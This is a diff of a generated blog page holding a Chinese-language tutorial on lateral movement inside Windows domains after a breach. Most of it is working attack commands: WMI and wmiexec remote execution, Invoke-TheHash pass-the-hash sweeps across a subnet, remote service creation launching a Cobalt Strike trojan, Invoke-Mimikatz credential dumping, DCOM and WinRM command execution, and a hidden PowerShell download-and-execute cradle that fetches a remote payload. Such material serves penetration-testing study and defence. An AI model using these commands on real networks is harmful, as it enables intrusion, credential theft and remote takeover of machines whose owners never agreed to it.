@@ -169,6 +169,8 @@
       detectApple()
     })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">133</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="senu11"><span class="site-name">senu11</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-10-13T08:24:00.000Z" title="发表于 2020-10-13 16:24:00">2020-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>在攻击者获取到某台内网机器的控制权限以及拿到其他机器的账户密码之后，进一步会考虑如何在内网进行横向移动，以及攻击域控服务器，本文总结了突破边界后进一步的攻击技巧。</p>
 <span id="more"></span>
+
+
 <h2 id="1-WMI"><a href="#1-WMI" class="headerlink" title="1.WMI"></a>1.WMI</h2><p>WMI全称”windows管理规范”，从win2003开始一直存在。</p>
 <p><strong>利用条件</strong></p>
 <p>1、WMI服务开启，端口135，默认开启。</p>
@@ -180,32 +182,39 @@
 <p><img src="image-20210204130530497.png" alt="image-20210204130530497"><img src="image-20210204130606900.png" alt="image-20210204130606900"></p>
 <p>cmd执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /NODE:目标ip /user:&quot;域\主机名&quot; /password:&quot;密码&quot; PROCESS call create &quot;webshell&quot;</span><br><span class="line">#注意wenshell的payload闭合时产生的双引号需要转义</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204125808036.png" alt="image-20210204125808036"></p>
 <p>cs成功上线。</p>
 <h3 id="2-wmiexec-vbs"><a href="#2-wmiexec-vbs" class="headerlink" title="2.wmiexec.vbs"></a>2.wmiexec.vbs</h3><p>域环境下或者在工作组环境下都可以正常使用，使用域账号或者本地账户均可</p>
 <p>工作组</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.x.x administrator Aatest</span><br></pre></td></tr></table></figure>
+
 <p>域环境</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 目标ip 域名\用户 密码</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204131550106.png" alt="image-20210204131550106"></p>
 <p>即得到目标的cmd</p>
 <h3 id="3-Invoke-TheHash-ps1"><a href="#3-Invoke-TheHash-ps1" class="headerlink" title="3.Invoke-TheHash.ps1"></a>3.Invoke-TheHash.ps1</h3><p>在目标主机上分别导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1</p>
 <p><img src="image-20210204131656073.png" alt="image-20210204131656073">!</p>
 <p>批量撞网段内的机器即可：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target 192.168.93.0/24 -Domain 域控名 -Username administrator -Hash 已知hash</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204132053457.png" alt="image-20210204132053457"></p>
 <p>成功的机器可以使用WMI连接</p>
 <h3 id="4-pth工具集（kali自带）"><a href="#4-pth工具集（kali自带）" class="headerlink" title="4.pth工具集（kali自带）"></a>4.pth工具集（kali自带）</h3><p>执行以下命令可以得到目标cmd环境：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U 账户名%&#x27;密码&#x27; --system --ostype=1 //目标ip cmd</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204132324616.png" alt="image-20210204132324616"></p>
 <h2 id="2-Remote-Service-Creation"><a href="#2-Remote-Service-Creation" class="headerlink" title="2.Remote Service Creation"></a>2.Remote Service Creation</h2><p>远程服务控制，可以通过smb安排任务，在客户机1上执行操作启动客户机2的服务，也就要求了客户机1对客户机2具有操作权限</p>
 <p>先用cs生成一个服务类型的木马</p>
 <p><img src="image-20210204133407667.png" alt="image-20210204133407667"></p>
 <p>在客户机1上执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\客户机2-ip create ExampleService binpath=&quot;path\service.exe&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204133613686.png" alt="image-20210204133613686"></p>
 <p>成功创建了一个服务ExampleService，需要手动开启：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\客户机2-ip start ExampleService</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204133824089.png" alt="image-20210204133824089"></p>
 <p>此时cs会得到一个system的会话</p>
 <p><img src="image-20210204133853885.png" alt="image-20210204133853885"></p>
@@ -222,24 +231,34 @@
 <h2 id="4-PowerShell-Remoting"><a href="#4-PowerShell-Remoting" class="headerlink" title="4.PowerShell Remoting"></a>4.PowerShell Remoting</h2><p>winRM服务，2012之后默认开启，也可以使用以下命令开启：<code>winrm quickconfig</code></p>
 <p>执行以下命令连接到开启了服务的机器：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -Computername TARGET</span><br></pre></td></tr></table></figure>
+
 <p>或者远程获取机器的账号密码（利用条件：administrator或者winRM）：</p>
 <p>在客户机2上导入mimikatz的ps1脚本<code>Import-Module .\mimikatz.ps1</code>，执行以下命令就可以获取客户机1的账户密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -DumpCreds -ComputerName 客户机1-NAME.域控名</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204140032023.png" alt="image-20210204140032023"></p>
 <h2 id="5-Task-Scheduler"><a href="#5-Task-Scheduler" class="headerlink" title="5.Task Scheduler"></a>5.Task Scheduler</h2><p>计划任务，winodws内置，administrators执行 ,2008之后不能使用交互式了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at time /interactive cmd 	#不再可以使用这样的了</span><br></pre></td></tr></table></figure>
+
 <p>且at变为schtasks</p>
 <p>本地创建任务：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create /SC ONCE /TN spawn /TR task_command /ST time</span><br><span class="line">#TN：任务名称</span><br><span class="line">#TR：任务执行的程序</span><br><span class="line">#ST：任务执行的时间</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204141155993.png" alt="image-20210204141155993"></p>
 <p>本地删除任务（cmd下）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Delete /TN spawn /F &gt;nul 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
 <p>远程创建</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create /S target /RU user_name /RP user_password /TN task_name /TR task_command /SC daily /ST time </span><br><span class="line"># task_command 只能是一个文件，不能是什么命令，例如启动一个木马，可以直接计划任务执行m木马，也可以写一个bat启动，然后计划任务执行此bat</span><br></pre></td></tr></table></figure>
+
 <p>powershell版本执行方法</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>若你当前拥有一台机器的administrator权限，但是得不到域内的任何东西，也即无法与DC通信，可以尝试提权到system之后，就能与DC正常通信了。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="6-PsExec"><a href="#6-PsExec" class="headerlink" title="6.PsExec"></a>6.PsExec</h2><h3 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h3><p>微软自家产品。通过ipc$连接，然后释放psexesvc.exe到目标机器；通过服务管理器SCManager远程创建psexecsvc服务，并启动服务；客户端连接执行命令，服务端启动相应程序并执行回显数据</p>
 <p>得到指定域内机器cmd：<code>Psexec.exe \\域内主机名 cmd</code></p>
 <p><img src="image-20210204153102437.png" alt="image-20210204153102437"></p>
@@ -261,29 +280,36 @@
 <p>就是一个中间件，支持交互。</p>
 <p>枚举所有DCOM对象</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance win32-DCOMApplication	PS下</span><br></pre></td></tr></table></figure>
+
 <p>部分docm能进行命令执行，通过这些dcom进行横向移动，例如</p>
 <p><strong>MMC20.APPLICATION COM OBJECT</strong></p>
 <p>可以使用以下命令查看DCOM的一些信息，再PS下执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &#x27;registry::HKEY_CLASSES_ROOT_WOW6432Note\CLSID\&#123;49B2791A-B1AE-4C90-9B8E-E8608AC7F889&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
 <p>查询的出来的。。</p>
 <p>远程利用方式如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a =[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application.1&quot;, &quot;target_ip&quot;))</span><br><span class="line">$a.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot; ,Snull, &quot;/c  hostname &gt; c:\fromdcom.txt &quot;, &quot;7&quot;)</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204161144789.png" alt="image-20210204161144789"></p>
-<p>执行成功后会在目标生成<code>c:\fromdcom.txt</code></p>
+<p>执行成功后会在目标生成<code>c:\fromdcom.txt </code></p>
 <h2 id="8-Password-Spray"><a href="#8-Password-Spray" class="headerlink" title="8.Password Spray"></a>8.Password Spray</h2><p>进行密码破解</p>
 <p><img src="image-20210204161455802.png" alt="image-20210204161455802"></p>
 <h2 id="9-winrm远程管理服务"><a href="#9-winrm远程管理服务" class="headerlink" title="9.winrm远程管理服务"></a>9.winrm远程管理服务</h2><p>WinRM是Microsoft对WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的”防火墙友协议,它让来自不同供应商的硬件和操作系统能够互相操作.</p>
 <p>winRM的默认端口为5985 ( http )或5986 ( https )</p>
 <p>第一次使用要设置一个信任</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br><span class="line">Restart-Service winRM</span><br></pre></td></tr></table></figure>
+
 <p>反弹一个cs会话：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName target_ip -ScriptBlock &#123; powershell.exe -nop -w hidden -c &quot;IEX((new-object net.webclient).downloadstring(&quot;webshell_addr&quot;)&quot;&#125; -credential administrator</span><br></pre></td></tr></table></figure>
+
 <p>反弹shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName target_ip -Credential 域名\用户名</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204161911483.png" alt="image-20210204161911483"></p>
 <p><strong>Winrs</strong></p>
 <p>远程管理</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:target_ip -u:DC\username -p:password &quot;command&quot;</span><br></pre></td></tr></table></figure>
+
 <p>例如得到ip信息</p>
 <p><img src="image-20210204162104661.png" alt="image-20210204162104661"></p>
 <p>将命令替换为cmd即可得到目标cmd环境。</p>
@@ -295,6 +321,7 @@
 <p>等待即可</p>
 <h2 id="10-Pass-The-Hash-pth"><a href="#10-Pass-The-Hash-pth" class="headerlink" title="10.Pass-The-Hash(pth)"></a>10.Pass-The-Hash(pth)</h2><p>hash传递攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:USER  /ntlm:HASH /run: cmd.exe</span><br></pre></td></tr></table></figure>
+
 <p><img src="image-20210204163408004.png" alt="image-20210204163408004"></p>
 <p>执行完毕后会弹出cmd框</p>
 <p><img src="image-20210204163549805.png" alt="image-20210204163549805"></p>
